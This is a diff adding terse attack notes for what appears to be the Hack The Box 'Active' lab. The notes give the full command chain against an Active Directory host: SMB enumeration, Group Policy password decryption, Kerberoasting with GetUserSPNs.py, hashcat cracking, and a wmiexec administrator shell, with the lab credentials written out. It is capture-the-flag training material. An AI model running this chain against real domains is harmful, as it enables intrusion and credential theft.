@@ -1,0 +1,29 @@
+Nmap -sC -sV 10.10.10.100 -o nmap.tcp
+Nmap -sC -sV 10.10.10.100 -oA nmap-report
+Nmap -p445 --script smb2-time 10.10.10.100
+smbclient -L 10.10.10.100 --no-pass
+smbclient //10.10.10.100/Replication --no-pass
+smbclient //10.10.10.100/Replication --no-pass -c 'recurse;ls'
+crackmapexec smb 10.10.10.100 -u '' -p '' --shares
+crackmapexec smb 10.10.10.100 -d ACTIVE -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+Xdg-open .
+Gpp-decrypt <HASH>  :: Herramienta para decifrar hash windows/active directory
+GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+python ~/HACKTHEBOX/CRACKING-TOOLS/impacket-0.9.18/build/scripts-2.7/GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+hashcat -m 13100 hash.administrator /usr/share/wordlists/rockyou.txt --force
+impacket-wmiexec active/administrator:Ticketmaster1968@10.10.10.100
+
+
+
+
+
+Apt-get install crackmapexec
+locate GetUserSPNs.py
+Runas /netonly /user:ACTIVE\SVC_TGS cmd.exe
+Net time \\10.10.10.100 /set /yes
+hwclock --show
+Hwclock --set --date “2018-12-16 20:57:35.765334-0500” --localtime
+Iptables --table nat --append POSTROUTING --out-interface tun0 -j MASQUERADE
+Echo 1 > /proc/sys/net/ipv4/ip_forward
+Route add 10.10.10.100 mask 255.255.255.0 <IP-KALI>
+
